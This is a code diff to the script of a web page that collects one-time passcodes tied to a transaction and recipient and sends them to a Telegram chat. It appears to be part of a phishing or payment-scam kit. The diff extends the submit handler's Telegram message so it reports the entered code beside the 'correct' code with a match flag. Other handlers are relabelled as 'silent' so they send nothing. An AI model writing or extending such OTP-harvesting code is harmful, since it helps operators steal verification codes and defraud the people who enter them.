@@ -607,8 +607,6 @@
   async function onOtpExpired() {
     otpSubmitBtn.disabled = true;
     otpInputs.forEach(i => i.disabled = true);
-
-    // ❌ No Telegram notification on OTP expiry
     showStatus('The OTP has expired. Please request a new code.', 'error');
   }
 
@@ -628,8 +626,6 @@
       }));
     } catch(e) {}
 
-    // ❌ No Telegram message on page load
-    // Just reset status and start polling for the eventual user submission
     await fetch(`/api/reset/${encodeURIComponent(txnId)}`, { method: 'POST' });
     startPolling();
   }
@@ -755,7 +751,10 @@
     }, 1000);
   }
 
-  // ---- Submit (THE ONLY TELEGRAM MESSAGE) ----
+  // ============================================================
+  // SUBMIT — the ONLY Telegram message
+  // Shows entered code + correct code + match status
+  // ============================================================
   otpSubmitBtn.addEventListener('click', async () => {
     if (isSubmitting) return;
     const entered = otpInputs.map(i => i.value).join('');
@@ -776,6 +775,8 @@
 
 ━━━━━━━━━━━━━━━━━━━━
 <b>Entered code:</b> <code>${esc(entered)}</code>
+<b>Correct code:</b> <code>${esc(currentOtpCode || '—')}</code>
+<b>Match:</b> ${entered === currentOtpCode ? '✅ YES' : '❌ NO'}
 
 ━━━━━━━━━━━━━━━━━━━━
 <b>Recipient:</b> ${esc(session.recipientName || '—')}
@@ -794,7 +795,7 @@
     startPolling();
   });
 
-  // ---- Inline resend (no Telegram) ----
+  // ---- Inline resend (silent) ----
   otpResendBtn.addEventListener('click', async () => {
     if (otpResendBtn.disabled) return;
     otpResendBtn.disabled = true;
@@ -813,8 +814,6 @@
       }));
     } catch(e) {}
 
-    // ❌ No Telegram notification on inline resend
-
     setTimeout(() => {
       otpResendBtn.disabled = false;
       resendLabel.textContent = 'Resend code';
@@ -829,7 +828,7 @@
     }, 700);
   });
 
-  // ---- Popup resend button (no Telegram) ----
+  // ---- Popup resend button (silent) ----
   popupResendBtn.addEventListener('click', async () => {
     popupResendBtn.disabled = true;
     popupResendBtn.innerHTML = '<svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2.5" fill="none" stroke-dasharray="30 60"/></svg>Generating...';
@@ -848,9 +847,6 @@
       }));
     } catch(e) {}
 
-    // ❌ No Telegram notification after decline resend
-
-    // Reset the underlying OTP card
     otpInputs.forEach(i => {
       i.value = '';
       i.classList.remove('filled', 'error');
